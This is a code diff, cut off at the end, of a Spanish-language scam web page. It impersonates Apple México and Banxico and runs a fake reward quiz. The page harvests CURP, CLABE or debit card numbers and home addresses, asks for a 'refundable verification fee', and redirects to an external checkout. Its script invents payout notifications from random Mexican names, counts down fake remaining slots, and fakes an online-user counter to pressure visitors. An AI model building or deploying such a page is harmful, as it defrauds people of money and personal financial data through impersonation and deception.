-        <h2>¡Retiro Disponible! 💸</h2>
-
-        <div class="verified-badge">✅ Cuenta verificada en México</div>
-
-        <div class="saldo-display">
-            <div class="saldo-label">Saldo Total Acumulado</div>
-            <div class="saldo-value" id="saldoFinal">$0.00 MXN</div>
-        </div>
-
-        <div class="input-group">
-            <label>Selecciona método de recepción (SPEI):</label>
-            <select id="metodoSelect">
-                <option value="curp">CURP</option>
-                <option value="clabe">CLABE Interbancaria</option>
-                <option value="tarjeta">Número de Tarjeta de Débito</option>
-            </select>
-        </div>
-
-        <div class="input-group">
-            <label id="inputLabel">Ingresa tu CURP:</label>
-            <input type="text" id="chaveInput" placeholder="Ej: GARC850101HDFRRL09">
-        </div>
-
-        <div class="validando-box" id="validando">
-            <div class="loader"></div>
-            Consultando elegibilidad con Apple México...
-        </div>
-
-        <button class="btn-primary btn-success" id="btnSolicitar">REALIZAR RETIRO AHORA</button>
-
-        <div class="security-footer">
-            <div class="security-badges">
-                <span class="badge badge-secure">🔒 Cifrado SSL</span>
-                <span class="badge badge-fast">⚡ SPEI en minutos</span>
-            </div>
+    <div class="taxa-item">
+        <div class="icon">⚡</div>
+        <div>
+            <b>SPEI Instantáneo</b>
+            <p>Liberación inmediata tras la validación de seguridad.</p>
         </div>
     </div>
 
-    <!-- VERIFICACIÓN -->
-    <div class="taxa-container" id="taxaContainer">
-        <div class="mexico-ribbon"></div>
-
-        <div class="step-indicator">
-            <div class="step"><div class="step-num done">✓</div></div>
-            <div class="step-line done"></div>
-            <div class="step"><div class="step-num done">✓</div></div>
-            <div class="step-line done"></div>
-            <div class="step"><div class="step-num active">3</div></div>
-            <div class="step-line"></div>
-            <div class="step"><div class="step-num">4</div></div>
-        </div>
-
-        <div style="text-align:center; margin-bottom: 20px;">
-            <div style="font-size: 50px; margin-bottom: 8px;">🔐</div>
-            <h2>Verificación de Identidad</h2>
-            <p style="font-size: 14px; color: var(--text-gray); line-height: 1.5;">
-                Para liberar el depósito de <strong id="valorComTaxa" style="color: var(--success);"></strong>, se requiere validar tu cuenta mediante una tasa mínima reembolsable.
-            </p>
-        </div>
-
-        <div class="taxa-item">
-            <div class="icon">🔄</div>
-            <div>
-                <b>Importe Reembolsable</b>
-                <p>Los $90,57 MXN se sumarán a tu retiro automáticamente.</p>
-            </div>
-        </div>
-
-        <div class="taxa-item">
-            <div class="icon">⚡</div>
-            <div>
-                <b>SPEI Instantáneo</b>
-                <p>Liberación inmediata tras la validación de seguridad.</p>
-            </div>
-        </div>
-
-        <div class="taxa-item">
-            <div class="icon">🛡️</div>
-            <div>
-                <b>Protegido por Apple México</b>
-                <p>Tu información está protegida con cifrado de extremo a extremo.</p>
-            </div>
-        </div>
-
-        <div class="taxa-item">
-            <div class="icon">🇲🇽</div>
-            <div>
-                <b>Regulado por Banxico</b>
-                <p>Transferencia procesada dentro del sistema financiero mexicano.</p>
-            </div>
-        </div>
-
-        <button class="btn-primary btn-blue" id="btnPagarTaxa">PAGAR VERIFICACIÓN Y RECIBIR</button>
-
-        <div class="trust-bar">
-            <div class="trust-item">🔒 256-bit SSL</div>
-            <div class="trust-item">🇲🇽 Banxico</div>
-            <div class="trust-item">✅ Verificado</div>
+    <div class="taxa-item">
+        <div class="icon">🛡️</div>
+        <div>
+            <b>Protegido por Apple México</b>
+            <p>Tu información está protegida con cifrado de extremo a extremo.</p>
         </div>
     </div>
 
-    <!-- ENVÍO -->
-    <div class="envio-container" id="envioContainer">
-        <div class="mexico-ribbon"></div>
+    <button class="btn-primary btn-blue" id="btnPagarTaxa">PAGAR VERIFICACIÓN Y RECIBIR</button>
 
-        <div class="step-indicator">
-            <div class="step"><div class="step-num done">✓</div></div>
-            <div class="step-line done"></div>
-            <div class="step"><div class="step-num done">✓</div></div>
-            <div class="step-line done"></div>
-            <div class="step"><div class="step-num done">✓</div></div>
-            <div class="step-line done"></div>
-            <div class="step"><div class="step-num active">4</div></div>
-        </div>
+    <div class="trust-bar">
+        <span class="trust-item">🔒 256-bit SSL</span>
+        <span class="trust-item">🇲🇽 Banxico</span>
+        <span class="trust-item">✅ Verificado</span>
+    </div>
+</div>
 
-        <div class="envio-header">
-            <div style="font-size: 45px; margin-bottom: 8px;">📦</div>
-            <h2>Datos de Envío</h2>
-            <p>Has ganado un <strong>iPhone 15 Pro Max</strong>. Confirma tu dirección en México:</p>
-        </div>
-
-        <div class="input-group">
-            <label>Nombre completo</label>
-            <input type="text" placeholder="Ej: Juan Pérez García">
-        </div>
-        <div class="input-group">
-            <label>Calle y número</label>
-            <input type="text" placeholder="Ej: Av. Reforma 505, Int. 3">
-        </div>
-        <div class="input-group">
-            <label>Colonia</label>
-            <input type="text" placeholder="Ej: Juárez">
-        </div>
-        <div class="input-group">
-            <label>Ciudad y Estado</label>
-            <input type="text" placeholder="Ej: Ciudad de México, CDMX">
-        </div>
-        <div class="input-group">
-            <label>Código Postal</label>
-            <input type="text" placeholder="Ej: 06600" maxlength="5">
-        </div>
-
-        <button class="btn-primary btn-mexico" id="btnFinalizar">CONFIRMAR ENVÍO Y RECIBIR SPEI</button>
+<!-- ENVÍO -->
+<div class="envio-container" id="envioContainer">
+    <div class="envio-header">
+        <div style="font-size: 40px;">📦</div>
+        <h2>Datos de Envío</h2>
+        <p>Has ganado un iPhone 15 Pro Max. Confirma tu dirección en México:</p>
     </div>
 
-    <!-- POPUP GANASTE -->
-    <div class="popup" id="popupGanhou">
-        <div class="popup-box">
-            <div class="popup-icon">🪙</div>
-            <div class="popup-reward-tag">💎 RECOMPENSA DESBLOQUEADA</div>
-            <div class="popup-label">¡Acabas de ganar!</div>
-            <div class="popup-valor" id="popupValor">$0.00 MXN</div>
-            <p class="popup-subtitle">Este monto se ha sumado a tu saldo</p>
-            <button class="btn-primary btn-success" onclick="proxima()">Continuar Quiz ➜</button>
-        </div>
+    <div class="input-group">
+        <label>Nombre completo</label>
+        <input type="text" placeholder="Tu nombre completo">
+    </div>
+    <div class="input-group">
+        <label>Calle y número</label>
+        <input type="text" placeholder="Ej: Av. Reforma 505">
+    </div>
+    <div class="input-group">
+        <label>Colonia</label>
+        <input type="text" placeholder="Ej: Cuauhtémoc">
+    </div>
+    <div class="input-group">
+        <label>Ciudad y Estado</label>
+        <input type="text" placeholder="Ej: Ciudad de México, CDMX">
+    </div>
+    <div class="input-group">
+        <label>Código Postal</label>
+        <input type="text" placeholder="Ej: 06500" maxlength="5">
     </div>
 
-    <!-- POPUP CONQUISTA FINAL -->
-    <div class="popup" id="popupConquista">
-        <div class="popup-box conquista-box">
-            <div class="popup-icon">🎉</div>
-            <h2>¡Logro Completo!</h2>
-            <div class="conquista-valor" id="valorFinalTotal">$0.00 MXN</div>
-            <p style="margin-bottom: 6px;">Tu iPhone 15 Pro y el depósito están listos.</p>
-            <p style="font-size: 12px; margin-bottom: 22px;">Haz clic abajo para finalizar tu registro en la pasarela segura.</p>
-            <button class="btn-primary" id="btnFinalReal" style="background: linear-gradient(135deg, var(--gold), #e6950e);">FINALIZAR AHORA ➜</button>
-        </div>
-    </div>
+    <button class="btn-primary btn-success" id="btnFinalizar">CONFIRMAR ENVÍO Y RECIBIR SPEI</button>
+</div>
 
-    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
-    <script>
-        // ===== SPLASH SCREEN =====
-        let splashProgress = 0;
-        const splashInterval = setInterval(() => {
-            splashProgress += Math.random() * 15 + 5;
-            if (splashProgress >= 100) {
-                splashProgress = 100;
-                clearInterval(splashInterval);
-                setTimeout(() => {
-                    document.getElementById('splashScreen').classList.add('hide');
-                    document.getElementById('quizContainer').style.display = 'block';
-                }, 400);
-            }
-            document.getElementById('splashBar').style.width = splashProgress + '%';
-        }, 300);
-
-        // ===== REALISTIC COIN SOUND =====
-        const AudioCtx = window.AudioContext || window.webkitAudioContext;
-        let audioCtx;
-
-        function playCoinSound() {
-            if (!audioCtx) audioCtx = new AudioCtx();
-            const now = audioCtx.currentTime;
-
-            // Metallic hit
-            const osc1 = audioCtx.createOscillator();
-            const gain1 = audioCtx.createGain();
-            osc1.type = 'sine';
-            osc1.frequency.setValueAtTime(3520, now);
-            osc1.frequency.exponentialRampToValueAtTime(1760, now + 0.15);
-            gain1.gain.setValueAtTime(0.25, now);
-            gain1.gain.exponentialRampToValueAtTime(0.001, now + 0.2);
-            osc1.connect(gain1).connect(audioCtx.destination);
-            osc1.start(now); osc1.stop(now + 0.2);
-
-            // Resonance ring
-            const osc2 = audioCtx.createOscillator();
-            const gain2 = audioCtx.createGain();
-            osc2.type = 'sine';
-            osc2.frequency.setValueAtTime(2637, now + 0.03);
-            osc2.frequency.exponentialRampToValueAtTime(1318, now + 0.4);
-            gain2.gain.setValueAtTime(0.15, now + 0.03);
-            gain2.gain.exponentialRampToValueAtTime(0.001, now + 0.5);
-            osc2.connect(gain2).connect(audioCtx.destination);
-            osc2.start(now + 0.03); osc2.stop(now + 0.5);
-
-            // High overtone for metallic character
-            const osc3 = audioCtx.createOscillator();
-            const gain3 = audioCtx.createGain();
-            osc3.type = 'square';
-            osc3.frequency.setValueAtTime(5274, now);
-            osc3.frequency.exponentialRampToValueAtTime(3520, now + 0.08);
-            gain3.gain.setValueAtTime(0.04, now);
-            gain3.gain.exponentialRampToValueAtTime(0.001, now + 0.1);
-            osc3.connect(gain3).connect(audioCtx.destination);
-            osc3.start(now); osc3.stop(now + 0.1);
-
-            // Second coin bounce
-            setTimeout(() => {
-                const now2 = audioCtx.currentTime;
-                const osc4 = audioCtx.createOscillator();
-                const gain4 = audioCtx.createGain();
-                osc4.type = 'sine';
-                osc4.frequency.setValueAtTime(4186, now2);
-                osc4.frequency.exponentialRampToValueAtTime(2093, now2 + 0.12);
-                gain4.gain.setValueAtTime(0.18, now2);
-                gain4.gain.exponentialRampToValueAtTime(0.001, now2 + 0.3);
-                osc4.connect(gain4).connect(audioCtx.destination);
-                osc4.start(now2); osc4.stop(now2 + 0.3);
-            }, 120);
-        }
-
-        // ===== MULTIPLE COIN ANIMATIONS =====
-        function spawnCoinAnimation() {
-            const moneyBox = document.getElementById('moneyBoxTop');
-            const rect = moneyBox.getBoundingClientRect();
-            for (let i = 0; i < 4; i++) {
-                setTimeout(() => {
-                    const coin = document.createElement('span');
-                    coin.className = 'coin-float';
-                    coin.textContent = ['🪙','💰','✨','💵'][i];
-                    coin.style.left = (rect.left + rect.width/2 - 10 + (Math.random()-0.5)*40) + 'px';
-                    coin.style.top = rect.top + 'px';
-                    document.body.appendChild(coin);
-                    setTimeout(() => coin.remove(), 1200);
-                }, i * 80);
-            }
-        }
-
-        // ===== STREAK BAR =====
-        function updateStreakBar() {
-            const bar = document.getElementById('streakBar');
-            bar.innerHTML = '';
-            const total = perguntas.length;
-            // Show max 6 dots for mobile
-            const showCount = Math.min(total, 6);
-            const startIdx = Math.max(0, etapa - 3);
-            const endIdx = Math.min(total, startIdx + showCount);
-
-            for (let i = startIdx; i < endIdx; i++) {
-                if (i > startIdx) {
-                    const conn = document.createElement('div');
-                    conn.className = 'streak-connector' + (i <= etapa ? ' done' : '');
-                    bar.appendChild(conn);
-                }
-                const dot = document.createElement('div');
-                dot.className = 'streak-dot';
-                if (i < etapa) { dot.classList.add('completed'); dot.textContent = '✓'; }
-                else if (i === etapa) { dot.classList.add('current'); dot.textContent = i + 1; }
-                else { dot.textContent = i + 1; }
-                bar.appendChild(dot);
-            }
-        }
-
-        // ===== NOTIFICACIONES =====
-        const mexicanNames = ["Ximena G.", "Alejandro M.", "Sofía R.", "Miguel Ángel L.", "Valentina H.", "Mateo S.", "Camila D.", "Diego F.", "Isabella P.", "Javier T.", "Lucía V.", "Carlos N.", "Renata O.", "Fernando C.", "Mariana B.", "Ana Karen Z.", "Roberto J.", "Guadalupe A.", "José Luis Q.", "Paola E."];
-        const mexicanCities = ["CDMX", "Guadalajara", "Monterrey", "Puebla", "Cancún", "Mérida", "Querétaro", "León", "Tijuana", "Oaxaca", "San Luis Potosí", "Aguascalientes"];
-        const timeAgo = ["Hace 1 min", "Hace 2 min", "Hace 5 min", "Hace 8 min", "Ahora mismo", "Hace 30 seg"];
-
-        function showNotification() {
-            const notif = document.getElementById('notification');
-            const name = mexicanNames[Math.floor(Math.random() * mexicanNames.length)];
-            const city = mexicanCities[Math.floor(Math.random() * mexicanCities.length)];
-            const amount = (Math.random() * (4500 - 1500) + 1500).toFixed(2);
-            const time = timeAgo[Math.floor(Math.random() * timeAgo.length)];
-            const imgId = Math.floor(Math.random() * 70);
-
-            document.getElementById('notifImg').src = `https://i.pravatar.cc/100?u=${imgId}`;
-            document.getElementById('notifTitle').innerText = `${name} de ${city}`;
-            document.getElementById('notifText').innerText = `Recibió $${amount} MXN vía SPEI`;
-            document.getElementById('notifTime').innerText = time;
-
-            notif.classList.add('show');
-            setTimeout(() => notif.classList.remove('show'), 4500);
-        }
-
-        setInterval(showNotification, 8000);
-        setTimeout(showNotification, 4000);
-
-        // ===== QUIZ =====
-        const perguntas = [
-            { t: "¿Qué producto Apple usas más?", o: ["📱 iPhone", "💻 MacBook", "⌚ Apple Watch", "🎧 AirPods"] },
-            { t: "¿Cómo calificas el rendimiento de iOS?", o: ["🚀 Excelente", "👍 Bueno", "🙂 Regular", "😕 Podría mejorar"] },
-            { t: "¿Te gustaría probar el Apple Vision Pro?", o: ["🤩 ¡Claro!", "🤔 Quizás", "😎 Ya lo quiero", "🙅‍♂️ No sé"] },
-            { t: "¿Qué color de iPhone prefieres?", o: ["⚪ Blanco", "⚫ Negro", "🩶 Titanio", "🔵 Azul"] },
-            { t: "¿Usas iCloud para tus fotos?", o: ["☁️ Sí, siempre", "📱 No, solo local", "🔄 Prefiero otra nube", "💎 Tengo el plan Pro"] },
-            { t: "¿Cuál es tu prioridad al comprar?", o: ["📸 Cámara", "🔋 Batería", "⚡ Velocidad", "🎨 Diseño"] },
-            { t: "¿Qué opinas de los nuevos AirPods?", o: ["🎧 Increíbles", "👌 Buenos", "🙂 Están bien", "💸 Muy caros"] },
-            { t: "¿Usas Apple Pay en México?", o: ["💳 Sí, todo el tiempo", "📱 A veces", "🏦 No sé usarlo", "❌ No"] },
-            { t: "¿Steve Jobs es tu inspiración?", o: ["🍎 Sí, totalmente", "👔 Prefiero a Wozniak", "📈 Un gran líder", "🤷‍♂️ Solo uso el cel"] },
-            { t: "¿Cuál será tu próximo Apple?", o: ["📱 iPhone 15", "⌚ Watch Ultra", "💻 Mac M3", "🕶️ Vision Pro"] },
-            { t: "¿Recomendarías Apple a un amigo?", o: ["✅ Al 100%", "🤔 Tal vez", "🙌 Definitivamente", "🌟 Sí"] },
-            { t: "¿Estás listo para tu recompensa?", o: ["🔥 ¡SÍ!", "🚀 ¡VAMOS!", "💰 ¡LISTO!", "🎁 ¡DÁMELA!"] }
-        ];
-
-        const valores = [142.20, 110.50, 195.30, 125.80, 150.40, 130.20, 165.90, 140.10, 180.50, 210.30, 155.70, 324.41];
-        let etapa = 0;
-        let saldoAcumulado = 0;
-
-        function formatMXN(v) { return "$" + v.toLocaleString('en-US', { minimumFractionDigits: 2 }) + " MXN"; }
-
-        function carregarPergunta() {
-            const q = perguntas[etapa];
-            document.getElementById('qTitle').innerText = q.t;
-            document.getElementById('progressText').innerText = `Pregunta ${etapa + 1} de ${perguntas.length}`;
-            const box = document.getElementById('options');
-            box.innerHTML = '';
-            document.getElementById('btnNext').disabled = true;
-            document.getElementById('progressBar').style.width = ((etapa) / perguntas.length * 100) + "%";
-            updateStreakBar();
-
-            q.o.forEach((opt, i) => {
-                const d = document.createElement('div');
-                d.className = 'option';
-                d.style.animation = `fadeInUp 0.4s ease-out ${i * 0.08}s forwards`;
-                d.innerText = opt;
-                d.onclick = () => {
-                    document.querySelectorAll('.option').forEach(el => el.classList.remove('selected'));
-                    d.classList.add('selected');
-                    document.getElementById('btnNext').disabled = false;
-                    // Small haptic-like feedback
-                    if (navigator.vibrate) navigator.vibrate(10);
-                };
-                box.appendChild(d);
-            });
-        }
-
-        document.getElementById('btnNext').onclick = () => {
-            const v = valores[etapa];
-            document.getElementById('popupGanhou').style.display = 'flex';
-
-            playCoinSound();
-            spawnCoinAnimation();
-
-            let atual = 0;
-            const anim = setInterval(() => {
-                atual += v / 25;
-                if (atual >= v) { atual = v; clearInterval(anim); }
-                document.getElementById('popupValor').innerText = formatMXN(atual);
-            }, 30);
-
-            saldoAcumulado += v;
-            setTimeout(() => {
-                document.getElementById('saldoTopo').innerText = formatMXN(saldoAcumulado);
-                const mb = document.getElementById('moneyBoxTop');
-                mb.classList.add('earning');
-                document.getElementById('saldoTopo').classList.add('shine');
-                setTimeout(() => {
-                    document.getElementById('saldoTopo').classList.remove('shine');
-                    mb.classList.remove('earning');
-                }, 800);
-            }, 500);
-
-            // Mini confetti on each answer
-            if (etapa % 3 === 0) {
-                confetti({ particleCount: 30, spread: 50, origin: { y: 0.7 }, colors: ['#006847','#ffffff','#ce1126'] });
-            }
-        };
-
-        function proxima() {
-            document.getElementById('popupGanhou').style.display = 'none';
-            etapa++;
-            if (etapa < perguntas.length) {
-                carregarPergunta();
-            } else {
-                document.getElementById('progressBar').style.width = "100%";
-                confetti({ particleCount: 250, spread: 90, origin: { y: 0.6 }, colors: ['#006847','#ffffff','#ce1126','#f5a623'] });
-                setTimeout(() => confetti({ particleCount: 120, spread: 60, origin: { y: 0.5 } }), 400);
-                document.getElementById('quizContainer').style.display = 'none';
-                document.getElementById('resgateContainer').style.display = 'block';
-                document.getElementById('saldoFinal').innerText = formatMXN(saldoAcumulado);
-            }
-        }
-
-        // ===== MÉTODO SELECT =====
-        const metodoSelect = document.getElementById('metodoSelect');
-        const inputLabel = document.getElementById('inputLabel');
-        const chaveInput = document.getElementById('chaveInput');
-
-        metodoSelect.addEventListener('change', () => {
-            const val = metodoSelect.value;
-            if (val === 'curp') {
-                inputLabel.innerText = 'Ingresa tu CURP:';
-                chaveInput.placeholder = 'Ej: GARC850101HDFRRL09';
-            } else if (val === 'clabe') {
-                inputLabel.innerText = 'Ingresa tu CLABE Interbancaria:';
-                chaveInput.placeholder = 'Ej: 012345678901234567';
-            } else if (val === 'tarjeta') {
-                inputLabel.innerText = 'Ingresa tu número de tarjeta de débito:';
-                chaveInput.placeholder = 'Ej: 4152 3131 0000 0000';
-            }
-        });
-
-        // ===== SOLICITAR RETIRO =====
-        document.getElementById('btnSolicitar').onclick = () => {
-            if (document.getElementById('chaveInput').value.length < 5) return alert("Ingresa un dato válido para continuar.");
-            document.getElementById('btnSolicitar').style.display = 'none';
-            document.getElementById('validando').style.display = 'flex';
-            setTimeout(() => {
-                document.getElementById('resgateContainer').style.display = 'none';
-                document.getElementById('taxaContainer').style.display = 'block';
-                document.getElementById('valorComTaxa').innerText = formatMXN(saldoAcumulado + 69);
-            }, 3000);
-        };
-
-        document.getElementById('btnPagarTaxa').onclick = () => {
-            document.getElementById('taxaContainer').style.display = 'none';
-            document.getElementById('envioContainer').style.display = 'block';
-        };
-
-        document.getElementById('btnFinalizar').onclick = () => {
-            document.getElementById('envioContainer').style.display = 'none';
-            document.getElementById('popupConquista').style.display = 'flex';
-            document.getElementById('valorFinalTotal').innerText = formatMXN(saldoAcumulado + 69);
-            confetti({ particleCount: 200, spread: 80, origin: { y: 0.6 }, colors: ['#006847','#ffffff','#ce1126','#f5a623'] });
-        };
-
-        document.getElementById('btnFinalReal').onclick = () => {
-            window.location.href = "https://pay.mycheckoutt.com/019d4084-87c4-7303-99ea-69a0a42ff9ea?ref=";
-        };
-
-        // ===== URGENCIA =====
-        let v_vagas = 12;
-        setInterval(() => {
-            if (v_vagas > 3) {
-                v_vagas--;
-                document.getElementById('vagas').innerText = v_vagas;
-            }
-        }, 15000);
-
-        // ===== ONLINE COUNT =====
-        setInterval(() => {
-            const base = 1847;
-            const variation = Math.floor(Math.random() * 50 - 25);
-            document.getElementById('onlineCount').innerText = (base + variation).toLocaleString();
-        }, 5000);
-
-        carregarPergunta();
-    </script>
-</body>
-</html>
+<!-- POPUP GANHOU -->
+<div class="popup" id="popupGanhou">
+    <div class="popup-box">
+        <div class="popup-icon">🪙</div>
+        <div class="popup-label">¡Acabas de ganar!</div>
+        <div class="popup-valor" id="popupValor">$0.00 MXN</div>
+        <p class="popup-subtitle">Este monto se ha sumado a tu saldo</p>
+        <button class="btn-primary" onclick
